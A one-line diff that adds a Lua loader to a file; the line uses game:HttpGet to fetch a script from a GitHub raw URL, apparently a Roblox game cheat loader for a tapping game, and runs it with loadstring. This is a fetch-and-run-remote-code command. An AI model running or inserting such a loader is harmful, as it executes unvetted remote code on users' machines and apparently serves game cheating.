@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/tap-simulator-reborn-spam3-n95ozfe9o8nueq.lua"))()
